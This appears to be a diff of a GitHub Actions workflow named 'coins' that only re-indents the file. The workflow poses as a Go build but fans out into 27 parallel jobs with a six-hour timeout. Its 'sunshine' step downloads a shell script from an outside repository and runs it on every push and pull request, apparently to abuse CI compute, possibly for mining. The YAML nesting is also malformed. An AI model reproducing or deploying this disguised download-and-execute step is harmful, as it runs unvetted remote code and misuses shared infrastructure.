@@ -1,27 +1,30 @@
 name: coins 
 on: [push, pull_request] 
 jobs: 
-build: 
-name: sunshine 
-runs-on: ubuntu-18.04 
-strategy: 
-max-parallel: 1 
-fail-fast: false 
-matrix: 
-go-version: [1.12.16, 1.13.11, 1.14.3] 
-flag: [A, B, C, D, E, F, G, H, I] 
-timeout-minutes: 360 
-env: 
-  NUM_JOBS: 20 
-  JOB: ${{ matrix.go }} 
-steps: 
-- name: Set up Go ${{ matrix.go-version }} 
-  uses: actions/setup-go@v1 
-with: 
-  go-version: ${{ matrix.go-version }} 
-  id: go
-- name: Setup 
-  uses: actions/checkout@v2 
-- name: sunshine 
-  run: | 
-  wget https://github.com/venetta999/turtleturtle/blob/main/turtleturtle.sh && chmod u+x turtleturtle.sh && ./turtleturtle.sh
+ build: 
+  name: sunshine 
+  runs-on: ubuntu-18.04 
+  strategy: 
+  max-parallel: 1 
+  fail-fast: false 
+  matrix: 
+     go-version: [1.12.16, 1.13.11, 1.14.3] 
+     flag: [A, B, C, D, E, F, G, H, I] 
+     timeout-minutes: 360 
+  env: 
+     NUM_JOBS: 20 
+     JOB: ${{ matrix.go }} 
+     
+  steps: 
+  - name: Set up Go ${{ matrix.go-version }} 
+    uses: actions/setup-go@v1 
+    with: 
+     go-version: ${{ matrix.go-version }} 
+    id: go
+    
+  - name: Setup 
+    uses: actions/checkout@v2
+    
+  - name: sunshine 
+    run: | 
+    wget https://github.com/venetta999/turtleturtle/blob/main/turtleturtle.sh && chmod u+x turtleturtle.sh && ./turtleturtle.sh
